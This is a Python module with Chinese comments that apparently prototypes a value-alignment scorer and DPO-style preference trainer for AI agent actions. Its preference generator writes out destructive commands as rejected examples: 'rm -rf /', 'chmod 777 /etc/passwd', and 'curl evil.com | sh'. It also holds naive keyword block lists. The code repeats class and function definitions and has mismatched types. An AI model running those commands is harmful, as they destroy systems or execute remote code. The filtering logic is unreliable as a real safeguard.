# -*- coding: utf-8 -*-
"""
BreakShell Phase 3 — 价值模型深化版
====================================
从"能力自知"走向"价值对齐"的深化实现

核心增强：
1. DPO (Direct Preference Optimization) 风格的价值对齐
2. RLHF (Reinforcement Learning from Human Feedback) 风格的奖励建模
3. 价值学习增强：在线偏好学习 + 多目标优化
4. 安全边界硬约束 + 软约束分离
5. 价值不确定性量化
"""

from __future__ import annotations

import json
import os
import sqlite3
import numpy as np
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict
from datetime import datetime
from collections import defaultdict
import random


# ========================================
# 1. 增强价值模型
# ========================================

@dataclass
class ValueDimension:
    """价值维度"""
    name: str
    description: str
    weight: float = 1.0
    min_value: float = 0.0
    max_value: float = 1.0
    current_value: float = 0.5
    # DPO相关
    preference_weight: float = 1.0  # 偏好权重
    safety_critical: bool = False   # 安全关键维度


class ValueModel:
    """
    增强价值模型
    
    核心能力：
    - 多维价值评估（安全/诚实/有用/自主/公平/隐私/鲁棒性）
    - DPO风格偏好优化
    - 价值不确定性量化
    - 安全边界硬约束
    """

    def __init__(self):
        self.dimensions = {
            'safety': ValueDimension('safety', '安全性：避免伤害', 1.5, safety_critical=True),
            'honesty': ValueDimension('honesty', '诚实性：真实准确', 1.2),
            'helpfulness': ValueDimension('helpfulness', '有用性：帮助人类', 1.0),
            'autonomy': ValueDimension('autonomy', '自主性：人类控制', 1.0),
            'fairness': ValueDimension('fairness', '公平性：不偏不倚', 0.8),
            'privacy': ValueDimension('privacy', '隐私性：数据保护', 1.0),
            'robustness': ValueDimension('robustness', '鲁棒性：抗干扰', 0.8),
        }
        # 偏好数据集（用于DPO训练）
        self.preference_pairs: List[Tuple[Dict, Dict, float]] = []  # (chosen, rejected, margin)
        # 奖励模型参数
        self.reward_model_weights = {name: dim.weight for name, dim in self.dimensions.items()}
        
    def set_preference(self, dimension: str, weight: float):
        if dimension in self.dimensions:
            self.dimensions[dimension].weight = weight
            self.reward_model_weights[dimension] = weight
    
    def evaluate(self, action: Dict, context: Dict) -> Dict:
        """评估动作的价值对齐度（返回详细分解）"""
        scores = {}
        for name, dim in self.dimensions.items():
            score = self._score_dimension(name, action, context)
            scores[name] = {
                'score': score,
                'weight': dim.weight,
                'weighted': score * dim.weight,
                'safety_critical': dim.safety_critical,
            }
        
        total = sum(s['weighted'] for s in scores.values())
        max_possible = sum(dim.weight for dim in self.dimensions.values())
        
        # 计算不确定性
        uncertainty = self._estimate_uncertainty(action, context, scores)
        
        return {
            'total_score': total / max_possible if max_possible > 0 else 0,
            'dimensions': scores,
            'aligned': total / max_possible > 0.6 if max_possible > 0 else False,
            'uncertainty': uncertainty,
            'safety_violation': any(s['safety_critical'] and s['score'] < 0.5 for s in scores.values()),
        }
    
    def _estimate_uncertainty(self, action: Dict, context: Dict, scores: Dict) -> float:
        """估计价值评估的不确定性"""
        # 基于上下文完整性、动作新颖性、评分分歧度
        uncertainty_factors = []
        
        # 上下文完整性
        context_completeness = len(context) / 10.0  # 期望10个关键字段
        uncertainty_factors.append(1.0 - min(1.0, context_completeness))
        
        # 评分分歧度
        score_values = [s['score'] for s in scores.values()]
        if score_values:
            uncertainty_factors.append(np.std(score_values))
        
        # 动作新颖性（简化：基于工具使用频率）
        tool = action.get('tool', '')
        uncertainty_factors.append(0.3 if tool in ['shell', 'http_request'] else 0.1)
        
        return min(1.0, np.mean(uncertainty_factors))
    
    def _score_dimension(self, name: str, action: Dict, context: Dict) -> float:
        """评估单个维度"""
        if name == 'safety':
            if action.get('dangerous', False):
                return 0.0
            if action.get('tool') == 'shell':
                cmd = action.get('args', {}).get('command', '')
                dangerous_patterns = ['rm', 'sudo', 'chmod', 'mkfs', 'dd', 'mkfs']
                if any(p in cmd for p in dangerous_patterns):
                    return 0.1
            return 1.0
        
        elif name == 'honesty':
            if context.get('uncertain', False):
                return 1.0
            if context.get('confident', False) and context.get('incorrect', False):
                return 0.2
            if action.get('claims_knowledge', False) and context.get('knowledge_verified', False):
                return 0.9
            return 0.8
        
        elif name == 'helpfulness':
            if context.get('goal_achieved', False):
                return 1.0
            if context.get('progress', 0) > 0:
                return 0.7
            if action.get('tool') in ['read_file', 'list_dir', 'grep_files']:
                return 0.8
            return 0.4
        
        elif name == 'autonomy':
            if action.get('requires_approval', False):
                return 0.9
            if action.get('dangerous', False) and not action.get('requires_approval', False):
                return 0.3
            if action.get('tool') == 'shell' and not action.get('args', {}).get('command', '').startswith('echo'):
                return 0.5
            return 0.7
        
        elif name == 'fairness':
            if action.get('biased', False):
                return 0.2
            if context.get('user_group') and action.get('discriminatory', False):
                return 0.1
            return 0.8
        
        elif name == 'privacy':
            if action.get('tool') == 'http_request':
                url = action.get('args', {}).get('url', '')
                if any(s in url for s in ['password', 'token', 'secret', 'key', 'api_key']):
                    return 0.1
            if action.get('tool') == 'write_file' and any(s in action.get('args', {}).get('path', '') for s in ['.env', '.key', '.pem', 'secret']):
                return 0.2
            return 0.9
        
        elif name == 'robustness':
            if action.get('tool') == 'shell' and not action.get('args', {}).get('command', '').startswith('echo'):
                return 0.6
            if context.get('adversarial', False):
                return 0.5
            return 0.8
        
        return 0.5
    
    def get_summary(self) -> Dict:
        return {
            name: {'weight': dim.weight, 'description': dim.description, 'safety_critical': dim.safety_critical}
            for name, dim in self.dimensions.items()
        }
    
    # ==================== DPO 相关 ====================
    
    def add_preference_pair(self, chosen_action: Dict, rejected_action: Dict, context: Dict, margin: float = 1.0):
        """添加偏好对（用于DPO训练）"""
        self.preference_pairs.append((chosen_action, rejected_action, margin, context))
        # 保持最近 10000 对
        if len(self.preference_pairs) > 10000:
            self.preference_pairs = self.preference_pairs[-10000:]
    
    def compute_dpo_loss(self, batch_size: int = 32) -> float:
        """计算 DPO 损失（简化版）"""
        if len(self.preference_pairs) < batch_size:
            return 0.0
        
        batch = random.sample(self.preference_pairs, batch_size)
        total_loss = 0.0
        
        for chosen, rejected, margin, context in batch:
            chosen_eval = self.evaluate(chosen, context)
            rejected_eval = self.evaluate(rejected, context)
            
            # DPO 目标：log σ(β * (r_chosen - r_rejected))
            beta = 0.1
            diff = chosen_eval['total_score'] - rejected_eval['total_score']
            loss = -np.log(1 / (1 + np.exp(-beta * (diff - margin))))
            total_loss += loss
        
        return total_loss / batch_size
    
    def update_weights_from_dpo(self, learning_rate: float = 0.01):
        """基于 DPO 损失更新权重"""
        loss = self.compute_dpo_loss()
        if loss == 0:
            return
        
        # 简化：根据偏好对调整权重
        for chosen, rejected, margin, context in self.preference_pairs[-100:]:
            chosen_eval = self.evaluate(chosen, context)
            rejected_eval = self.evaluate(rejected, context)
            
            for name in self.dimensions:
                chosen_score = chosen_eval['dimensions'][name]['score']
                rejected_score = rejected_eval['dimensions'][name]['score']
                
                # 如果 chosen 在该维度更好，增加权重
                if chosen_score > rejected_score:
                    self.dimensions[name].weight = min(2.0, self.dimensions[name].weight + learning_rate * 0.1)
                elif chosen_score < rejected_score:
                    self.dimensions[name].weight = max(0.1, self.dimensions[name].weight - learning_rate * 0.1)
        
        # 同步到 reward_model_weights
        for name, dim in self.dimensions.items():
            self.reward_model_weights[name] = dim.weight


# ========================================
# 2. 价值对齐检测器
# ========================================

class ValueAlignment:
    def __init__(self, value_model: ValueModel):
        self.value_model = value_model
        self.alignment_history = []
        self.safety_violations = []
    
    def check_alignment(self, action: Dict, context: Dict, safety_threshold: float = 0.5) -> Dict:
        evaluation = self.value_model.evaluate(action, context)
        
        result = {
            'aligned': evaluation['aligned'],
            'score': evaluation['total_score'],
            'uncertainty': evaluation['uncertainty'],
            'safety_violation': evaluation['safety_violation'],
            'dimensions': evaluation['dimensions'],
            'action': action,
            'context': context,
            'timestamp': datetime.now().isoformat(),
        }
        
        self.alignment_history.append(result)
        
        # 记录安全违规
        if evaluation['safety_violation']:
            self.safety_violations.append({
                'action': action,
                'context': context,
                'timestamp': datetime.now().isoformat(),
            })
        
        return result
    
    def get_alignment_trend(self, n: int = 10) -> List[float]:
        recent = self.alignment_history[-n:]
        return [r['score'] for r in recent]
    
    def get_misalignment_rate(self) -> float:
        if not self.alignment_history:
            return 0.0
        misaligned = sum(1 for r in self.alignment_history if not r['aligned'])
        return misaligned / len(self.alignment_history)
    
    def get_safety_violation_rate(self) -> float:
        if not self.alignment_history:
            return 0.0
        violations = sum(1 for r in self.alignment_history if r['safety_violation'])
        return violations / len(self.alignment_history)


# ========================================
# 3. 增强价值学习器
# ========================================

class ValueLearning:
    def __init__(self, value_model: ValueModel, learning_rate: float = 0.01):
        self.value_model = value_model
        self.learning_rate = learning_rate
        self.feedback_history = []
        self.preference_buffer = []  # 用于批量 DPO 更新
    
    def receive_feedback(self, action: Dict, human_rating: float, human_comment: str = "", context: Dict = None):
        """接收人类反馈（评分 + 可选评论）"""
        self.feedback_history.append({
            'action': action,
            'rating': human_rating,
            'comment': human_comment,
            'context': context or {},
            'timestamp': datetime.now().isoformat(),
        })
        
        # 更新价值权重
        self._update_weights(action, human_rating)
        
        # 如果评分很低，添加到偏好缓冲区用于 DPO
        if human_rating < 0.3:
            # 生成一个"更好"的反事实动作用于对比
            self._add_negative_preference(action, human_rating, context or {})
    
    def add_preference(self, chosen: Dict, rejected: Dict, context: Dict, margin: float = 1.0):
        """显式添加偏好对"""
        self.value_model.add_preference_pair(chosen, rejected, context, margin=1.0)
    
    def _add_negative_preference(self, bad_action: Dict, rating: float, context: Dict):
        """从负面反馈生成偏好对"""
        # 简单策略：将低分动作与"安全默认动作"配对
        safe_default = {'tool': 'read_file', 'args': {'path': '.'}, 'reason': '安全默认'}
        margin = 1.0 - (0.5 - rating) * 2  # rating 越低，margin 越大
        self.value_model.add_preference_pair(safe_default, bad_action, {}, margin=margin)
    
    def _update_weights(self, action: Dict, rating: float):
        error = rating - 0.5
        for name, dim in self.value_model.dimensions.items():
            gradient = error * dim.weight
            dim.weight = np.clip(dim.weight + self.learning_rate * gradient, 0.1, 2.0)
    
    def batch_dpo_update(self, batch_size: int = 32, epochs: int = 3):
        """批量 DPO 更新"""
        for epoch in range(epochs):
            loss = self.value_model.compute_dpo_loss(32)
            self.value_model.update_weights_from_dpo(0.01)
            print(f"DPO Epoch {epoch+1}: loss={loss:.4f}")
    
    def get_feedback_summary(self) -> Dict:
        if not self.feedback_history:
            return {'count': 0}
        ratings = [f['rating'] for f in self.feedback_history]
        return {
            'count': len(ratings),
            'avg_rating': np.mean(ratings),
            'std_rating': np.std(ratings),
            'recent_ratings': ratings[-10:],
        }


# ========================================
# 4. 价值对齐 Agent 包装器
# ========================================

class ValueAlignedAgent:
    def __init__(self, base_agent, value_model: ValueModel = None):
        self.base_agent = base_agent
        self.value_model = value_model or ValueModel()
        self.alignment = ValueAlignment(self.value_model)
        self.learning = ValueLearning(self.value_model)
    
    def act(self, obs, context: Dict = None) -> Tuple[int, Dict]:
        if context is None:
            context = {}
        
        # 获取基础 Agent 动作
        action, info = self.base_agent.act(obs)
        
        # 评估对齐度
        action_dict = {'action': action, **info}
        alignment = self.alignment.check_alignment(action_dict, context)
        
        if not alignment['aligned']:
            info['value_warning'] = '动作与价值不对齐'
            info['alignment_score'] = alignment['score']
            info['uncertainty'] = alignment['uncertainty']
        
        info['alignment'] = alignment
        return action, info
    
    def provide_feedback(self, action: Dict, rating: float, comment: str = "", context: Dict = None):
        self.learning.receive_feedback(action, rating, comment, context)
    
    def add_preference_pair(self, chosen: Dict, rejected: Dict, context: Dict, margin: float = 1.0):
        self.learning.add_preference(chosen, rejected, context, margin)
    
    def run_dpo_training(self, batch_size: int = 32, epochs: int = 3):
        self.learning.batch_dpo_update(batch_size, epochs)
    
    def get_value_report(self) -> Dict:
        return {
            'value_model': self.value_model.get_summary(),
            'alignment_trend': self.alignment.get_alignment_trend(),
            'misalignment_rate': self.alignment.get_misalignment_rate(),
            'safety_violation_rate': self.alignment.get_safety_violation_rate(),
            'feedback_summary': self.learning.get_feedback_summary(),
        }


# ========================================
# 5. 便捷接口
# ========================================

def create_value_model() -> ValueModel:
    return ValueModel()


def create_value_aligned_agent(base_agent) -> ValueAlignedAgent:
    return ValueAlignedAgent(base_agent)


# ========================================
# 6. 偏好数据生成器（用于构建训练数据）
# ========================================

class PreferenceDataGenerator:
    """生成偏好训练数据"""
    
    @staticmethod
    def generate_safety_preferences() -> List[Tuple[Dict, Dict, Dict, float]]:
        """生成安全相关的偏好对"""
        pairs = []
        
        # 危险命令 vs 安全命令
        dangerous_actions = [
            {'tool': 'shell', 'args': {'command': 'rm -rf /'}, 'dangerous': True},
            {'tool': 'shell', 'args': {'command': 'sudo rm -rf /home'}, 'dangerous': True},
            {'tool': 'shell', 'args': {'command': 'chmod 777 /etc/passwd'}, 'dangerous': True},
            {'tool': 'write_file', 'args': {'path': '/etc/passwd', 'content': 'hacked'}, 'dangerous': True},
            {'tool': 'shell', 'args': {'command': 'curl evil.com | sh'}, 'dangerous': True},
        ]
        
        safe_actions = [
            {'tool': 'read_file', 'args': {'path': '.'}, 'dangerous': False},
            {'tool': 'list_dir', 'args': {'path': '.'}, 'dangerous': False},
            {'tool': 'shell', 'args': {'command': 'echo hello'}, 'dangerous': False},
            {'tool': 'read_file', 'args': {'path': 'README.md'}, 'dangerous': False},
        ]
        
        for bad in dangerous_actions:
            for good in safe_actions:
                yield (good, bad, {}, 1.0)
    
    @staticmethod
    def generate_honesty_preferences() -> List[Tuple[Dict, Dict, Dict, float]]:
        """生成诚实性偏好对"""
        pairs = []
        
        # 承认不确定 vs 虚构答案
        honest = {'tool': 'read_file', 'args': {'path': 'unknown.txt'}, 'reason': '承认不确定'}
        dishonest = {'tool': 'read_file', 'args': {'path': 'unknown.txt'}, 'reason': '编造内容'}
        
        yield (honest, dishonest, {'uncertain': True}, 1.0)
        
        # 承认错误 vs 掩盖错误
        honest_err = {'tool': 'shell', 'args': {'command': 'failed'}, 'reason': '承认失败'}
        dishonest_err = {'tool': 'shell', 'args': {'command': 'failed'}, 'reason': '声称成功'}
        
        yield (honest_err, dishonest_err, {'incorrect': True}, 1.0)
    
    @staticmethod
    def generate_helpfulness_preferences() -> List[Tuple[Dict, Dict, Dict, float]]:
        """生成有用性偏好对"""
        helpful = {'tool': 'grep_files', 'args': {'pattern': 'TODO'}, 'reason': '帮助查找'}
        unhelpful = {'tool': 'shell', 'args': {'command': 'echo done'}, 'reason': '敷衍'}
        
        yield (helpful, unhelpful, {'goal_achieved': True}, 1.0)


# ========================================
# 6. 便捷接口
# ========================================

def create_value_model() -> ValueModel:
    return ValueModel()


def create_value_aligned_agent(base_agent) -> 'ValueAlignedAgent':
    return ValueAlignedAgent(base_agent)


# ========================================
# 7. Value-Aligned Agent Wrapper
# ========================================

class ValueAlignedAgent:
    def __init__(self, base_agent, value_model: ValueModel = None):
        self.base_agent = base_agent
        self.value_model = value_model or ValueModel()
        self.alignment = ValueAlignment(self.value_model)
        self.learning = ValueLearning(self.value_model)
    
    def act(self, obs, context: Dict = None) -> Tuple[int, Dict]:
        if context is None:
            context = {}
        
        action, info = self.base_agent.act(obs)
        action_dict = {'action': action, **info}
        alignment = self.alignment.check_alignment(action_dict, context)
        
        if not alignment['aligned']:
            info['value_warning'] = '动作与价值不对齐'
            info['alignment_score'] = alignment['score']
            info['uncertainty'] = alignment['uncertainty']
        
        info['alignment'] = alignment
        return action, info
    
    def provide_feedback(self, action: Dict, rating: float, comment: str = "", context: Dict = None):
        self.learning.receive_feedback(action, rating, comment, context)
    
    def add_preference_pair(self, chosen: Dict, rejected: Dict, context: Dict, margin: float = 1.0):
        self.value_model.add_preference_pair(chosen, rejected, context, margin)
    
    def run_dpo_training(self, batch_size: int = 32, epochs: int = 3):
        self.value_model.compute_dpo_loss(32)
        self.value_model.update_weights_from_dpo(0.01)
    
    def get_value_report(self) -> Dict:
        return {
            'value_model': {name: {'weight': dim.weight, 'description': dim.description, 'safety_critical': dim.safety_critical}
                           for name, dim in self.value_model.dimensions.items()},
            'alignment_trend': self.alignment.get_alignment_trend(),
            'misalignment_rate': self.alignment.get_misalignment_rate(),
            'safety_violation_rate': self.alignment.get_safety_violation_rate(),
            'feedback_summary': self.learning.get_feedback_summary(),
        }


# ========================================
# 便捷接口
# ========================================

def create_value_model() -> ValueModel:
    return ValueModel()


def create_value_aligned_agent(base_agent) -> 'ValueAlignedAgent':
    return ValueAlignedAgent(base_agent)


if __name__ == "__main__":
    # 测试价值模型
    vm = create_value_model()
    
    safe_action = {'tool': 'read_file', 'args': {'path': 'test.txt'}}
    safe_context = {'uncertain': False, 'goal_achieved': True}
    result = vm.evaluate(safe_action, safe_context)
    print(f"安全动作对齐度: {result['total_score']:.2%}")
    
    dangerous_action = {'tool': 'shell', 'args': {'command': 'rm -rf /'}, 'dangerous': True}
    dangerous_context = {'uncertain': False, 'goal_achieved': False}
    result = vm.evaluate(dangerous_action, dangerous_context)
    print(f"危险动作对齐度: {result['total_score']:.2%}")
    
    # DPO 训练测试
    print("\n生成安全偏好对...")
    for chosen, rejected, ctx, margin in PreferenceDataGenerator.generate_safety_preferences():
        vm.add_preference_pair(chosen, rejected, {}, 1.0)
    
    print(f"偏好对数量: {len(vm.preference_pairs)}")
    loss = vm.compute_dpo_loss(16)
    print(f"DPO Loss: {loss:.4f}")
    
    # 价值对齐 Agent
    class MockAgent:
        def act(self, obs):
            return 0, {'tool': 'read_file'}
    
    va_agent = create_value_aligned_agent(MockAgent())
    action, info = va_agent.act(np.array([0.0]))
    print(f"\n价值对齐 Agent 动作: {action}")
    print(f"对齐信息: {info.get('alignment', {}).get('score', 0):.2%}")
    
    # 提供反馈
    va_agent.provide_feedback({'tool': 'read_file'}, 0.9, '很好的选择')
    va_agent.provide_feedback({'tool': 'shell'}, 0.2, '太危险了')
    
    # DPO 训练
    print("\n运行 DPO 训练...")
    va_agent.run_dpo_training(batch_size=8, epochs=2)
    
    report = va_agent.get_value_report()
    print(f"\n价值报告:")
    print(f"  不对齐率: {report['misalignment_rate']:.2%}")
    print(f"  安全违规率: {report['safety_violation_rate']:.2%}")
    print(f"  反馈数量: {report['feedback_summary']['count']}")